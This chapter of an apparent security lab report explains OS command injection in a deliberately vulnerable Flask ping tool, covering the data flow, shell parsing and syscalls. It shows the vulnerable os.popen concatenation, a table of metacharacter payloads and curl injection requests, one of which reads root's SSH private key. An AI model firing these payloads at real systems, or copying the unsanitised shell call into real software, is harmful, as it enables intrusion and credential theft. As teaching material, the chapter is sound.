\chapter{Remote Code Execution (RCE)}

\section{What is RCE}

Remote Code Execution (RCE) refers to a class of vulnerability in which an attacker causes a target system to execute attacker-controlled commands without requiring authenticated access or physical presence. It is considered the highest-impact category of web vulnerability because it grants the attacker the same operational capabilities as the process running the target application.

In this project, RCE is achieved through OS command injection in the NetDiag Flask application. The injected commands are executed by the Flask process itself, which runs as \texttt{UID 0} (root) inside a Docker container that has \texttt{/var/run/docker.sock} bind-mounted from the host. This combination elevates a single unauthenticated HTTP GET request into a full host compromise path.

Two subtypes of RCE are commonly distinguished. Code injection exploits runtime evaluation constructs such as \texttt{eval()} to execute attacker-supplied code within the application's interpreter. OS command execution, which is the subtype relevant here, passes attacker-controlled input into a shell execution function, causing the operating system shell to run arbitrary commands. The distinction matters because the privileges obtained differ: code injection executes within the interpreter's sandbox, while OS command execution inherits the full process environment, UID, and filesystem access of the application.

The severity ceiling of an RCE vulnerability depends entirely on the execution context. Here, the process context is \texttt{UID 0} inside a container with \texttt{docker.sock} accessible, making full host compromise possible. Per the CVSS v3 scoring framework, an unauthenticated RCE with no required interaction and high impact across confidentiality, integrity, and availability receives a base score of \textbf{9.8 (Critical)}.

\vspace{0.3cm}

\section{Command Injection as a Class of Vulnerability}

Command injection is formally catalogued as \textbf{CWE-78: Improper Neutralization of Special Elements used in an OS Command}. It appears in the OWASP Top 10 under \textbf{A03:2021 -- Injection}, a category that encompasses all cases where untrusted data is sent to an interpreter as part of a command or query.

Three necessary conditions must be simultaneously present for OS command injection to be exploitable. All three are present in NetDiag.

\begin{itemize}
    \item \textbf{User-controlled input reaches a shell execution function.} The \texttt{host} query parameter is read directly from the HTTP request and passed without any intermediate processing to \texttt{os.popen()}.
    \item \textbf{No sanitization or validation is applied.} The application performs no allowlist checking, regex filtering, type coercion, or escaping on the input value before use.
    \item \textbf{The function invokes a shell interpreter.} \texttt{os.popen()} passes its argument to \texttt{/bin/sh -c <string>}, meaning the full shell metacharacter set is available to an attacker.
\end{itemize}

Command injection is distinct from adjacent injection classes. SQL injection targets a database query parser and is constrained by SQL grammar. Code injection exploits \texttt{eval()}-style constructs and is bounded by the interpreter's capabilities. Server-Side Request Forgery (SSRF) controls a URL and targets network-reachable services. Path traversal manipulates filesystem paths. OS command injection uniquely grants direct shell access with the privileges of the target process.

Two operational variants exist. In \textbf{blind injection}, the attacker cannot observe command output directly and must infer execution via timing side-channels or out-of-band DNS/HTTP callbacks. In \textbf{non-blind injection}, command output is reflected back in the HTTP response, as is the case in NetDiag. Non-blind injection dramatically accelerates exploitation because every curl request returns immediate, full output with no auxiliary infrastructure required.

Python sink functions that introduce command injection risk include: \texttt{os.popen()}, \texttt{os.system()}, \texttt{subprocess.run(shell=True)}, and \texttt{subprocess.Popen(shell=True)}. All four pass the argument string to \texttt{/bin/sh -c} when the shell interface is used, making them equivalent from an attacker's perspective.

\vspace{0.3cm}

\section{The Injection Point in NetDiag}

The vulnerable code in \texttt{app.py} is:

\begin{lstlisting}[language=Python]
host = request.args.get('host', '')
result = os.popen("ping -c 3 " + host).read()
\end{lstlisting}

The data flow from HTTP request to shell execution proceeds as follows:

\begin{lstlisting}
GET /ping?host=<INPUT>
  -> request.args.get('host')      # raw string, zero sanitization
  -> "ping -c 3 " + host           # string concat, attacker controls tail
  -> os.popen(<string>)            # passed to /bin/sh -c
  -> shell interprets metacharacters
\end{lstlisting}

Flask uses the Werkzeug WSGI library for request parsing. Werkzeug performs URL-decoding before the value reaches the view function, meaning percent-encoded metacharacters are transparently decoded: \texttt{\%3B} becomes \texttt{;}, \texttt{\%26} becomes \texttt{\&}, and \texttt{\%7C} becomes \texttt{|}. An attacker can therefore submit shell metacharacters either as literal characters or as their percent-encoded equivalents and both will reach the shell unchanged.

Because the input is appended by string concatenation to a fixed prefix, the attacker controls everything after \texttt{ping -c 3 }. Injected commands execute within the Flask process environment, inheriting its current working directory, all open file descriptors, environment variables, and critically, \texttt{UID 0}. No privilege escalation step is necessary because the application already runs as root.

\vspace{0.3cm}

\section{Shell Metacharacters -- How \texttt{;} Breaks the Command}

When \texttt{os.popen()} is called with the string \texttt{ping -c 3 8.8.8.8;id}, the entire string is passed to \texttt{/bin/sh} as the argument to its \texttt{-c} flag. The shell must parse this string and determine the command structure before executing anything.

The semicolon (\texttt{;}) is a POSIX-defined command separator. The shell splits the input at each \texttt{;} and executes the resulting commands sequentially, regardless of whether the preceding command succeeded or failed. The injection \texttt{8.8.8.8;id} therefore produces two commands:

\begin{itemize}
    \item \texttt{ping -c 3 8.8.8.8} -- executes normally, producing ping output
    \item \texttt{id} -- executes unconditionally after ping completes, appending its output to the pipe
\end{itemize}

The full set of shell metacharacters available to an attacker is documented in Table~\ref{tab:metacharacters}.

\begin{table}[h]
\centering
\caption{Shell Metacharacter Reference for Command Injection}
\label{tab:metacharacters}
\begin{tabular}{|l|l|l|l|}
\hline
\textbf{Character} & \textbf{Behavior} & \textbf{Payload Example} & \textbf{Condition} \\
\hline
\texttt{;} & Sequential separator & \texttt{8.8.8.8;id} & Unconditional \\
\texttt{\&\&} & Logical AND & \texttt{8.8.8.8\&\&id} & Ping must succeed \\
\texttt{||} & Logical OR & \texttt{INVALID||id} & Ping must fail \\
\texttt{|} & Pipe & \texttt{8.8.8.8|wc} & Chains output \\
\texttt{\textbackslash n} / \texttt{\%0A} & Newline separator & \texttt{8.8.8.8\%0Aid} & Same as \texttt{;} \\
\texttt{\$()} & Command substitution & \texttt{\$(id)} & Nested execution \\
\texttt{\&} & Background execution & \texttt{8.8.8.8\&id} & Concurrent \\
\hline
\end{tabular}
\end{table}

The semicolon is preferred in this attack for three reasons. First, it is unconditional -- the injected command runs regardless of whether \texttt{ping} succeeds. Second, it requires no quoting and introduces no ambiguity in the shell's parse. Third, its percent-encoded form \texttt{\%3B} is always decoded correctly by Werkzeug.

It is worth noting that quoting the Python string concatenation would not prevent injection. Even if the developer wrote \texttt{"ping -c 3 '" + host + "'"}, an attacker could close the quote with a matching single-quote character in the payload and then inject freely. The only effective fix is to avoid shell interpretation entirely.

\vspace{0.3cm}

\section{Confirming Execution via \texttt{id}}

The canonical first payload in OS command injection exploitation is the \texttt{id} command. It prints the UID, GID, and group memberships of the current process, takes no arguments, produces no side effects, and is present on every POSIX-compliant system.

The confirmation request is:

\begin{lstlisting}
GET /ping?host=8.8.8.8%3Bid
\end{lstlisting}

A successful response body contains the ping output followed by:

\begin{lstlisting}
uid=0(root) gid=0(root) groups=0(root)
\end{lstlisting}

This output confirms three facts simultaneously: commands execute on the target OS and are not being sanitized or sandboxed; the process is running as \texttt{UID 0} (root); and full system access including package installation, socket operations, and filesystem writes is available without any further privilege escalation.

The \texttt{attack.sh} automation script encodes this check as a precondition gate:

\begin{lstlisting}[language=bash]
RESPONSE=$(curl -s "${TARGET}/ping?host=8.8.8.8%3Bid")
echo "$RESPONSE" | grep -q "uid=0" && echo "RCE confirmed"
\end{lstlisting}

Follow-up enumeration commands use the same injection vector to gather environment information:

\begin{lstlisting}[language=bash]
curl -s "http://192.168.98.4:5000/ping?host=8.8.8.8%3Buname+-a"
curl -s "http://192.168.98.4:5000/ping?host=8.8.8.8%3Bls+-la+/var/run/docker.sock"
\end{lstlisting}

\vspace{0.3cm}

\section{Why the Response Leaks to the Browser}

NetDiag exhibits non-blind injection because the injected command output is reflected directly in the HTTP response body. Understanding this reflection path explains why no out-of-band infrastructure is needed and why every enumeration command returns immediate results.

The output path from shell execution to HTTP response is:

\begin{lstlisting}
shell stdout -> pipe -> os.popen().read() -> Python string
    -> render_template -> HTTP response body
\end{lstlisting}

At the system call level, \texttt{os.popen()} creates a \texttt{pipe()} before calling \texttt{fork()}. The child process, which becomes the shell, has its \texttt{stdout} redirected to the pipe's write end via \texttt{dup2()}. The parent process blocks on \texttt{read()} on the pipe's read end. When the shell exits, all output that was written to the pipe becomes available to the parent in a single \texttt{read()} call. Because all commands in a shell session share the same \texttt{stdout}, output from every injected command is captured.

Flask passes the output string to Jinja2 via \texttt{render\_template}. Jinja2's \texttt{{{ result }}} syntax HTML-escapes special characters, which prevents XSS but passes plain text output through unmodified. The HTTP response code is always \texttt{200 OK} regardless of whether the injected command succeeded, failed, or produced an error.

Standard error (\texttt{stderr}) is not captured by \texttt{os.popen()} by default. To capture error output alongside standard output, the attacker appends \texttt{2>\&1} to the payload:

\begin{lstlisting}
8.8.8.8;cat /root/.ssh/id_rsa 2>&1
\end{lstlisting}

The non-blind nature of this injection means the full attack chain can be executed using only \texttt{curl} with no timing attacks, DNS callbacks, or HTTP exfiltration channels.

\vspace{0.3cm}

\section{OS-Level View -- What Happens When the Shell Runs}

This section traces the complete execution path from TCP packet arrival to HTTP response delivery for the request \texttt{GET /ping?host=8.8.8.8;id}.

\begin{figure}[h]
\centering
\vspace{3cm}
\caption{System call sequence from HTTP request to injected command output}
\end{figure}

\textbf{Step 1 -- Network ingress.} The TCP packet arrives at the host NIC. iptables DNAT rules forward port 5000 traffic to the container via a veth pair. The packet enters the container's network namespace and is delivered to Flask's \texttt{accept()} call, returning a socket file descriptor.

\textbf{Step 2 -- HTTP parsing.} Werkzeug calls \texttt{recv()} on the socket, parses the HTTP request line and headers, URL-decodes the query string (\texttt{\%3B} becomes \texttt{;}), and routes the request to the \texttt{ping()} view function.

\textbf{Step 3 -- \texttt{os.popen()} internals.}

\begin{lstlisting}
pipe()   -> [read_fd, write_fd]
fork()   -> child PID (inherits UID 0, all file descriptors)
child:   dup2(write_fd, STDOUT_FILENO)
         execve("/bin/sh", ["-c", "ping -c 3 8.8.8.8;id"])
parent:  close(write_fd)
         read(read_fd, ...)   <- blocks here
\end{lstlisting}

\textbf{Step 4 -- Shell parsing and execution.} \texttt{/bin/sh} receives the string \texttt{ping -c 3 8.8.8.8;id} as its \texttt{-c} argument. The shell parses the \texttt{;} separator and executes two commands sequentially:

\begin{lstlisting}
fork() + execve("/bin/ping", ["-c","3","8.8.8.8"])  -> ping runs, exits
fork() + execve("/usr/bin/id", ["id"])               -> id runs
    output "uid=0(root)..." written to stdout (pipe write end)
shell exits
\end{lstlisting}

\textbf{Step 5 -- Response assembly.} The parent process unblocks from \texttt{read()}, receives the complete output string, passes it to \texttt{render\_template}, and calls \texttt{send()} on the socket to deliver the HTTP response.

The process tree on the host during execution is:

\begin{lstlisting}
python3 app.py     PID 847  UID 0   <- Flask, container PID 1
  +-- /bin/sh -c   PID 848  UID 0   <- forked by os.popen
      +-- ping     PID 849  UID 0   <- exits before id runs
      +-- id       PID 850  UID 0   <- runs after ping
\end{lstlisting}

All PIDs exist within the container's PID namespace. The host sees the real underlying PIDs through \texttt{/proc}. No anomalous system calls are generated -- \texttt{fork()} and \texttt{execve()} are normal process operations. Detection of this attack requires process tree analysis and parent-child relationship monitoring rather than syscall blocking.

\vspace{0.5cm}